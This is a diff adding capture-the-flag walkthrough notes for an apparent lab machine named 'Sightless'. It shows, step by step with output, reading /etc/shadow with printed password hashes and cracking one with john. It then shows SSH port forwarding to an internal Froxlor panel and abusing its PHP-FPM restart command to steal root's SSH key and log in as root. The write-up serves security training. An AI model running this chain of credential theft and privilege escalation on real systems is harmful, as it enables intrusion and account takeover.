@@ -41,3 +41,157 @@ Changelog
 This version led to:
 https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944
 ************************************************************************************************************************************************************************************************
+Running inside a container:
+
+root@c184118df0a6:~# ls -la /
+ls -la /
+total 88
+drwxr-xr-x   1 root root 4096 Aug  2 09:30 .
+drwxr-xr-x   1 root root 4096 Aug  2 09:30 ..
+-rwxr-xr-x   1 root root    0 Aug  2 09:30 .dockerenv
+drwxr-xr-x   2 root root 4096 Feb 28  2022 bin
+drwxr-xr-x   2 root root 4096 Oct  3  2021 boot
+drwxr-xr-x   5 root root  340 Oct 13 10:47 dev
+-rwxr-xr-x   1 root root  413 Mar 12  2022 docker-entrypoint
+************************************************************************************************************************************************************************************************
+/etc/shadow is readable/ writable:
+
+cat /etc/shadow
+root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
+daemon:*:19051:0:99999:7:::
+bin:*:19051:0:99999:7:::
+sys:*:19051:0:99999:7:::
+sync:*:19051:0:99999:7:::
+games:*:19051:0:99999:7:::
+man:*:19051:0:99999:7:::
+lp:*:19051:0:99999:7:::
+mail:*:19051:0:99999:7:::
+news:*:19051:0:99999:7:::
+uucp:*:19051:0:99999:7:::
+proxy:*:19051:0:99999:7:::
+www-data:*:19051:0:99999:7:::
+backup:*:19051:0:99999:7:::
+list:*:19051:0:99999:7:::
+irc:*:19051:0:99999:7:::
+gnats:*:19051:0:99999:7:::
+nobody:*:19051:0:99999:7:::
+_apt:*:19051:0:99999:7:::
+node:!:19053:0:99999:7:::
+michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
+************************************************************************************************************************************************************************************************
+└─$ cat shadow.michael 
+$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
+
+└─$ john shadow.michael -w=/usr/share/wordlists/rockyou.txt   
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+insaneclownposse (?)     
+1g 0:00:00:58 DONE (2024-10-13 07:37) 0.01698g/s 995.4p/s 995.4c/s 995.4C/s kruimel..galati
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+************************************************************************************************************************************************************************************************
+└─$ ssh michael@10.10.11.32
+michael@10.10.11.32's password: 
+Last login: Sun Oct 13 11:40:37 2024 from 10.10.16.38
+michael@sightless:~$ 
+************************************************************************************************************************************************************************************************
+michael@sightless:~$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:45523         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:41393         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:55697         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -  
+************************************************************************************************************************************************************************************************
+Access the service running on port 8080 on localhost via SSH local port forwarding:
+
+└─$ curl http://127.0.0.1:9999                             
+curl: (7) Failed to connect to 127.0.0.1 port 9999 after 0 ms: Couldn't connect to server
+
+└─$ ssh -L 0.0.0.0:9999:127.0.0.1:8080 michael@10.10.11.32
+
+└─$ curl -I http://127.0.0.1:9999
+HTTP/1.1 200 OK
+Date: Sun, 13 Oct 2024 13:14:33 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Set-Cookie: PHPSESSID=vqfcrvncfdfrm01v430js87fd4; expires=Sun, 13-Oct-2024 13:24:33 GMT; Max-Age=600; path=/; domain=127.0.0.1; HttpOnly; SameSite=Strict
+...
+...
+************************************************************************************************************************************************************************************************
+Exploiting Chrome Remote Debugger:
+https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+************************************************************************************************************************************************************************************************
+- Froxlor --> PHP --> PHP-FPM Version --> php-pfm restart command (RCE via php):
+  php-pfm restart command = cp /root/.ssh/id_rsa /tmp/id_rsa
+- File copied successfuly to /tmp but was not readable because it was owned by root:root
+- created a s.sh script file with the following content:
+  chown -R michael:michael /tmp/id_rsa
+- made it executable:
+  chmod +x s.sh
+- rerun the php-pfm restart command with:
+  php-pfm restart command = /tmp/s.sh
+
+michael@sightless:~$ ls -l /tmp
+total 884
+-rw------- 1 root root   3381 Oct 13 12:30 id_rsa
+-rwxrwxr-x 1 michael michael     51 Oct 13 12:55 s.sh
+
+michael@sightless:~$ cat /tmp/s.sh 
+chown -R michael:michael /tmp/id_rsa
+
+michael@sightless:~$ ls -l /tmp
+total 884
+-rw------- 1 michael michael   3381 Oct 13 12:32 id_rsa
+-rwxrwxr-x 1 michael michael     51 Oct 13 12:55 s.sh
+************************************************************************************************************************************************************************************************
+└─$ chmod 600 id_rsa 
+
+└─$ ssh root@10.10.11.32 -i id_rsa      
+Last login: Sun Oct 13 13:25:12 2024 from 10.10.14.235
+root@sightless:~# ls -l
+total 12
+drwxr-xr-x 3 root root 4096 Aug  9 11:17 docker-volumes
+-rw-r----- 1 root root   33 Oct 13 10:47 root.txt
+drwxr-xr-x 3 root root 4096 Aug  9 11:17 scripts
+************************************************************************************************************************************************************************************************
+************************************************************************************************************************************************************************************************
+************************************************************************************************************************************************************************************************
